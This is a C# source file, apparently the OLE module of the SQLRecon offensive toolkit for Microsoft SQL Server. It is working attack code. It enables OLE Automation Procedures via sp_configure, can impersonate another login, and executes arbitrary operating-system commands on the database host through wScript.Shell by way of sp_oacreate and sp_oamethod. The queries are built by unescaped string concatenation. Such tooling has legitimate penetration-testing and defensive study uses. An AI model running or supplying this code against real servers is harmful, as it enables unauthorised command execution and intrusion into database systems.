using System;
using System.Collections.Generic;
using System.Data.SqlClient;

namespace SQLRecon.Modules
{
    public class OLE
    {
        // this will enable advanced options and Ole Automation Procedures, which allows for sp_oacreate and sp_oamethod
        public void Enable(SqlConnection con, String impersonate = "null")
        {
            if (!impersonate.Equals("null"))
            {
                EnableDisable(con, "1", impersonate);
            }
            else
            {
                EnableDisable(con, "1");
            }
        } // end Enable

        // this will disable Ole Automation Procedures
        public void Disable(SqlConnection con, String impersonate = "null")
        {
            if (!impersonate.Equals("null"))
            {
                EnableDisable(con, "0", impersonate);
            }
            else
            {
                EnableDisable(con, "0");
            }
        } // end Disable

        // this will execute an arbitrary command
        public void Command(SqlConnection con, String cmd, String impersonate = "null")
        {
            try
            {
                SqlCommand command = new SqlCommand();

                if (!impersonate.Equals("null"))
                {
                    command = new SqlCommand("EXECUTE AS LOGIN = '" + impersonate + "'; DECLARE @output INT; DECLARE @ProgramToRun VARCHAR(255); SET @ProgramToRun = 'Run(" + cmd + ")'; EXEC sp_oacreate 'wScript.Shell', @output out;  EXEC sp_oamethod @output, @ProgramToRun; EXEC sp_oadestroy @output;", con);
                }
                else
                {
                    command = new SqlCommand("DECLARE @output INT; DECLARE @ProgramToRun VARCHAR(255); SET @ProgramToRun = 'Run(" + cmd + ")'; EXEC sp_oacreate 'wScript.Shell', @output out;  EXEC sp_oamethod @output, @ProgramToRun; EXEC sp_oadestroy @output;", con);
                }

                SqlDataReader reader = command.ExecuteReader();
                Console.WriteLine("");
                reader.Read();
                if (reader.HasRows && reader[0].ToString().Equals("0"))
                {
                    Console.WriteLine("[+] Successfully executed command.\n");
                }
                else
                {
                    Console.WriteLine("\n[!] ERROR: Unable to execute command.\n");
                }
                
                reader.Close();
            }
            catch (SqlException ex)
            {
                if (ex.Errors[0].Message.ToString().Contains("permission"))
                {
                    Console.WriteLine("\n[!] ERROR: The current user does not have permissions to enable OLE Automation Procedures\n");
                }
                else if (ex.Errors[0].Message.ToString().Contains("blocked"))
                {
                    Console.WriteLine("\n[!] ERROR: You need to enable OLE Automation Procedures\n");

                }
                else
                {
                    Console.WriteLine("\n[!] ERROR: " + ex.Errors[0].Message.ToString() + "\n");
                }
                
            }
        } // end Command

        public void EnableDisable(SqlConnection con, String val, String impersonate = "null")
        {
            try
            {

                SqlCommand command = new SqlCommand();

                if (!impersonate.Equals("null"))
                {
                    command = new SqlCommand("EXECUTE AS LOGIN = '" + impersonate + "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', " + val + "; RECONFIGURE;", con);
                }
                else
                {
                    command = new SqlCommand("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', " + val + "; RECONFIGURE;", con);
                }

                SqlDataReader reader = command.ExecuteReader();
                Console.WriteLine("");
                reader.Read();

                if (!reader.HasRows && val.Equals("0"))
                {
                    Console.WriteLine("[+] Successfully disabled OLE Automation Procedures.\n");
                }
                else if (!reader.HasRows && val.Equals("1"))
                {
                    Console.WriteLine("[+] Successfully enabled OLE Automation Procedures.\n");
                }
                else
                {
                    Console.WriteLine(reader[0]);
                    Console.WriteLine("");
                }
                reader.Close();
            }
            catch (SqlException ex)
            {
                Console.WriteLine("\n[!] ERROR: " + ex.Errors[0].Message.ToString() + "\n");
            }            
        }
    }
}